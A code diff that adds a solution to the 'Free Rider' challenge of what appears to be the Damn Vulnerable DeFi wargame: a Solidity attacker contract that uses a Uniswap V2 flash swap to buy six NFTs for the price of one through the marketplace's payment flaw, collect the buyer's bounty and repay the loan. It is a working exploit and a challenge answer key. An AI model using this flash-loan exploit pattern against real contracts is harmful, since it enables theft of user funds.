@@ -135,8 +135,11 @@ contract FreeRider is Test {
          * EXPLOIT START *
          */
         vm.startPrank(attacker, attacker);
-
+        FreeRiderAttacker freeRiderAttacker =
+        new FreeRiderAttacker{value: 0.5 ether}(payable(address(freeRiderNFTMarketplace)), address(damnValuableNFT), address(uniswapV2Pair), address(dvt), payable(address(weth)), address(freeRiderBuyer), address(uniswapV2Router));
+        freeRiderAttacker.attack();
         vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
@@ -165,4 +168,76 @@ contract FreeRider is Test {
         assertEq(freeRiderNFTMarketplace.amountOfOffers(), 0);
         assertLt(address(freeRiderNFTMarketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
     }
+}
+
+contract FreeRiderAttacker {
+    address payable freeRiderNFTMarketplace;
+    address damnValuableNFT;
+    address uniswapV2Pair;
+    address dvt;
+    address payable weth;
+    address attacker;
+    address freeRiderBuyer;
+    address uniswapV2Router;
+
+    constructor(
+        address payable freeRiderNFTMarketplace_,
+        address damnValuableNFT_,
+        address uniswapV2Pair_,
+        address dvt_,
+        address payable weth_,
+        address freeRiderBuyer_,
+        address uniswapV2Router_
+    ) payable {
+        freeRiderNFTMarketplace = freeRiderNFTMarketplace_;
+        damnValuableNFT = damnValuableNFT_;
+        uniswapV2Pair = uniswapV2Pair_;
+        dvt = dvt_;
+        weth = weth_;
+        freeRiderBuyer = freeRiderBuyer_;
+        uniswapV2Router = uniswapV2Router_;
+        attacker = msg.sender;
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0Out, uint256 amount1Out, bytes memory data)
+        external
+        payable
+    {
+        uint256 repayAmount = abi.decode(data, (uint256));
+        WETH9(weth).withdraw(15 ether);
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            tokenIds[i] = i;
+        }
+        FreeRiderNFTMarketplace(freeRiderNFTMarketplace).buyMany{value: 15 ether}(tokenIds);
+        for (uint256 id = 0; id < 6; id++) {
+            DamnValuableNFT(damnValuableNFT).transferFrom(address(this), freeRiderBuyer, id);
+        }
+        WETH9(weth).deposit{value: 45 ether}();
+
+        address[] memory path = new address[](2);
+        path[0] = weth;
+        path[1] = dvt;
+        WETH9(weth).approve(uniswapV2Router, type(uint256).max);
+        IUniswapV2Router02(uniswapV2Router).swapTokensForExactTokens(
+            repayAmount, type(uint256).max, path, address(this), 100000
+        );
+        //(uint256 reserve0, uint256 reserve1,) = IUniswapV2Pair(uniswapV2Pair).getReserves();
+        //uint256 amountIn = IUniswapV2Router02(uniswapV2Router).getAmountIn(repayAmount, reserve1, reserve0);
+        //WETH9(weth).transfer(uniswapV2Pair, amountIn);
+        //IUniswapV2Pair(uniswapV2Pair).swap(repayAmount, 0, address(this), ""); //token0 = dvt, token1 = weth
+        DamnValuableToken(dvt).transfer(uniswapV2Pair, repayAmount);
+    }
+
+    function attack() external payable {
+        (uint256 reserve0, uint256 reserve1,) = IUniswapV2Pair(uniswapV2Pair).getReserves();
+        uint256 repayAmount = IUniswapV2Router02(uniswapV2Router).getAmountIn(15 ether, reserve0, reserve1);
+        IUniswapV2Pair(uniswapV2Pair).swap(0, 15 ether, address(this), abi.encode(repayAmount)); //token0 = dvt, token1 = weth
+    }
+
+    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable {}
 }
